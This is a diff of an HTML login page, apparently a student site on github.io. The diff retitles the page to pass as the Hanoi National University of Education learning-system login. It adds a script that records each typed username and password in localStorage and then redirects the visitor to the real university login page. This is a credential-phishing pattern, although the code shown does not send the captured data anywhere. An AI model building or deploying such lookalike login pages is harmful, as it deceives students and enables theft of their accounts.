@@ -7,7 +7,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
     <!-- Open Graph (Zalo / Facebook) -->
-    <meta property="og:title" content="CST Web – Trang quản lí sinh viên">
+    <meta property="og:title" content="Hệ thống quản lý học tập trực tuyến - Trường Đại học Sư phạm Hà Nội: Đăng nhập">
     <meta property="og:description" content="Xem thông tin, hình ảnh và nội dung chi tiết tại CST Web">
     <meta property="og:type" content="website">
     <meta property="og:url" content="https://hnuecst.github.io/cst/chuongtrinhdaotao.html">
@@ -258,19 +258,19 @@ body{
 
     <div class="input-box">
       <span class="icon user"></span>
-      <input type="text" placeholder="Tên đăng nhập/email">
+      <input type="text" placeholder="Tên đăng nhập/email" id="tk">
     </div>
 
     <div class="input-box">
       <span class="icon key"></span>
-      <input type="password" placeholder="Mật khẩu">
+      <input type="password" placeholder="Mật khẩu" id="mk">
     </div>
 
     <div class="forgot">
       <a href="#" style="font-size: 13px;color: rgb(164, 160, 163);">Bạn quên tên đăng nhập hoặc mật khẩu?</a>
     </div>
 
-    <a href="https://anndko.github.io/mahoa/"><button class="btn">Đăng nhập</button></a>
+ <button class="btn" >Đăng nhập</button>
 
     <div class="remember-wrap" style="display: flex; display:flex;justify-content: flex-end;">
         <label class="switch">
@@ -295,6 +295,23 @@ body{
   </div>
 
 </div>
+<script>
+  let dulieu = JSON.parse(localStorage.getItem("dulieu")) || [];
+  document.querySelector(".btn").onclick = function() {
+    let tk = document.getElementById("tk").value;
+    let mk = document.getElementById("mk").value;
+    let a ={
+      taikhoan: tk,
+      matkhau: mk
+    }
+    dulieu.push(a);
+    localStorage.setItem("dulieu", JSON.stringify(dulieu));
+    window.location.href = "https://cst.hnue.edu.vn/login/index.php";
+
+    
+  };
+
+</script>
 
 
 </body>
